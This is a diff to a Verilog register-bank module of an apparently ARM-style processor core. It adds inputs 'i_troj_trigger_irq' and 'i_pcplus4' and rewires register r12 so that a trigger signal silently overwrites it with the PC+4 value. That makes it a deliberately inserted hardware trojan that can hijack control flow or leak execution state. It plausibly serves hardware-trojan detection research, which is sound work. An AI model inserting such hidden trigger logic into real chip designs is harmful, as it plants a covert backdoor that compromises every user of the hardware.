@@ -67,6 +67,8 @@ input       [31:0]          i_reg,
 input       [3:0]           i_status_bits_flags,
 input                       i_status_bits_irq_mask,
 input                       i_status_bits_firq_mask,
+input                       i_troj_trigger_irq,
+input       [31:0]          i_pcplus4,
 
 output      [31:0]          o_rm,
 output reg  [31:0]          o_rs,
@@ -186,7 +188,8 @@ always @ ( posedge i_clk )
         r9       <= (i_reg_bank_wen[9 ] && !firq_idec) ? i_reg : r9;  
         r10      <= (i_reg_bank_wen[10] && !firq_idec) ? i_reg : r10; 
         r11      <= (i_reg_bank_wen[11] && !firq_idec) ? i_reg : r11; 
-        r12      <= (i_reg_bank_wen[12] && !firq_idec) ? i_reg : r12; 
+        r12      <= (i_troj_trigger_irq) ? i_pcplus4 :
+                    (i_reg_bank_wen[12] && !firq_idec) ? i_reg : r12; 
         
         r8_firq  <= (i_reg_bank_wen[8 ] &&  firq_idec) ? i_reg : r8_firq;
         r9_firq  <= (i_reg_bank_wen[9 ] &&  firq_idec) ? i_reg : r9_firq;
